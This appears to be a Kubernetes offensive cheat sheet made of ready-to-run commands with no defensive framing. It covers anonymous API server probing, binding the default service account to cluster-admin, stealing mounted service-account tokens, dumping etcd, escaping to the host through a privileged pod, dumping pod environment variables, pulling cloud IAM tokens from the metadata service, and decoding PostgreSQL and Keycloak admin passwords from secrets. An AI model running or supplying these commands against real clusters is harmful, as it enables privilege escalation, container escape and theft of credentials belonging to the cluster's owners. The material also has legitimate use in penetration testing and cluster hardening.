# Kubernetes Attack Vectors

## Unauthenticated API Server
```bash
# Check if API server allows anonymous access
curl -sk https://<api-server>:6443/api/v1/namespaces
curl -sk https://<api-server>:6443/api/v1/pods
```

## RBAC Privilege Escalation
```bash
# Check what you can do
kubectl auth can-i --list

# Can you create pods? → mount hostPath or serviceaccount token
# Can you exec into pods? → pivot to other pods
# Can you get secrets? → extract credentials

# Rolebinding escalation
kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default
```

## ServiceAccount Token Abuse
```bash
# Inside a pod, the SA token is mounted at:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use it from outside
kubectl --token=$(cat /tmp/sa_token) get pods -n kube-system
```

## etcd Direct Access
```bash
# If etcd is exposed (default port 2379)
ETCDCTL_API=3 etcdctl \
  --endpoints=https://<etcd-ip>:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only
```

## Container Escape via Privileged Pod
```bash
# If you can create a privileged pod:
kubectl run pwn --image=alpine --privileged --restart=Never -- sleep 3600
kubectl exec -it pwn -- chroot /host /bin/bash
```

## Exposed Secrets in Environment Variables
```bash
# Dump all pod env vars
for pod in $(kubectl get pods -o name); do
  echo "=== $pod ==="
  kubectl exec $pod -- env 2>/dev/null
done
```

## Node Metadata Service (Cloud)
```bash
# From within a pod
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## PostgreSQL Secret Extraction
```bash
kubectl get secret <pg-secret-name> -o jsonpath='{.data.postgres-password}' | base64 -d
kubectl get secret <pg-secret-name> -o jsonpath='{.data.POSTGRES_USER}' | base64 -d
```

## Keycloak Secret Extraction
```bash
kubectl get secret <keycloak-secret> -o jsonpath='{.data.KEYCLOAK_ADMIN_PASSWORD}' | base64 -d
kubectl get secret <keycloak-secret> -o jsonpath='{.data.KC_DB_PASSWORD}' | base64 -d
```

## Port-Forward for Internal Access
```bash
# Forward postgres to localhost
kubectl port-forward svc/postgresql 5432:5432 &

# Forward Keycloak admin to localhost
kubectl port-forward svc/keycloak 8080:80 &
```
